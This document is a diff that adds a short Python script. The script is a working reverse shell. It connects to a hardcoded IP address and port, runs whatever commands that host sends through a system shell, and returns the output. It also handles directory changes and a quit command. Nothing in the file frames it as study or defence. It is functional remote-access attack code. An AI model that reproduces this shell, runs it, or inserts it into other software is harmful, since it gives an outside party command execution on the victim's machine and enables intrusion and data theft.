@@ -1,0 +1,28 @@
+#!/usr/bin/env python3
+import os
+import socket
+import subprocess
+
+
+LHOST = '10.195.100.153'
+LPORT = 5555
+
+SendBack=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+SendBack.connect((LHOST,LPORT))
+while True :
+    path = os.getcwd()+ ' > '
+    SendBack.sendall(bytes(path.encode()))
+    data = SendBack.recv(1024).decode()
+    try:
+        Data = subprocess.run(data,shell=True,capture_output=True)
+        Data =bytes(Data.stdout.decode('latin-1').encode())
+        SendBack.sendall(Data)
+    except Exception  :
+        continue 
+    if 'quit' in data:
+        break
+    if 'cd' in data:
+        try:
+            os.chdir(str(data.split()[1].replace('\n','')))
+        except Exception:
+            continue
